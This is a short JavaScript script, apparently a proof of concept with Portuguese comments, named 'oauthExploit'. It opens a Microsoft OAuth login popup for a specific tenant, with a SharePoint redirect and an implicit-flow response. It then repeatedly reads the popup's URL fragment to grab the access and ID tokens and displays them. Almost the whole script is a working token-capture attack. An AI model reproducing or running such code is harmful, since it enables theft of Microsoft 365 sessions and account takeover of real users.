if(!window.oauthExploit) {
    window.oauthExploit = true;

    const oauthUrl = 'https://login.microsoftonline.com:443/03f44f58-9a15-4c83-bc6d-f35bcabf2d1b/oauth2/authorize?client%5Fid=00000003%2D0000%2D0ff1%2Dce00%2D000000000000&response%5Fmode=fragment&response%5Ftype=code%20id%5Ftoken&resource=00000003%2D0000%2D0ff1%2Dce00%2D000000000000&scope=openid&nonce=38D70A4A883A95FBC9E45212EFC2BED2D2BEEBCCBC4AEF8A%2D800B3B6DE5D4FDC824DE564F10FCD6C3C11E6178AD60CD339A8C4421F5743873&redirect%5Furi=https%3A%2F%2Farcanumtecnologiaptp%2Dmy%2Esharepoint%2Ecom%2F%5Fforms%2Fdefault%2Easpx&state=OD0w&claims=%7B%22id%5Ftoken%22%3A%7B%22xms%5Fcc%22%3A%7B%22values%22%3A%5B%22CP1%22%5D%7D%7D%7D&wsucxt=1&cobrandid=11bd8083%2D87e0%2D41b5%2Dbb78%2D0bc43c8a8e8a&client%2Drequest%2Did=b551a2a1%2D2032%2D5000%2D0815%2Dfe5b2803c531';
    console.log('Abrindo OAuth URL:', oauthUrl);

    const win = window.open(oauthUrl, '_blank', 'width=500,height=600');

    if (!win) {
        alert('Popup foi bloqueado pelo navegador!');
        return;
    }

    let attempts = 0;
    const maxAttempts = 20;

    function checkForTokens() {
        attempts++;
        console.log(`Tentativa ${attempts} de capturar tokens...`);

        if (win.closed) {
            console.log('Janela foi fechada');
            return;
        }

        try {
            // Verifica se voltou para um domínio acessível
            const currentUrl = win.location.href;
            console.log('URL atual:', currentUrl);

            if (win.location.hash && win.location.hash.length > 1) {
                const hash = win.location.hash.slice(1);
                console.log('Hash capturado:', hash);

                const params = new URLSearchParams(hash);
                const accessToken = params.get('access_token');
                const idToken = params.get('id_token');

                let tokenInfo = 'TOKENS OAUTH CAPTURADOS:\n\n';

                if (accessToken) {
                    tokenInfo += 'Access Token:\n' + accessToken + '\n\n';
                    console.log('Access Token:', accessToken);
                }

                if (idToken) {
                    tokenInfo += 'ID Token:\n' + idToken + '\n\n';
                    console.log('ID Token:', idToken);
                }

                alert(tokenInfo);
                win.close();
                return;
            }

        } catch(e) {
            // Cross-origin error esperado
            if (attempts % 3 === 0) {
                console.log(`Cross-origin error (tentativa ${attempts}):`, e.message);
            }
        }

        if (attempts < maxAttempts && !win.closed) {
            setTimeout(checkForTokens, 2000);
        } else {
            console.log('Máximo de tentativas atingido');
            if (!win.closed) {
                try { win.close(); } catch(e) {}
            }
        }
    }

    // Inicia verificações após 3 segundos
    setTimeout(checkForTokens, 3000);
}
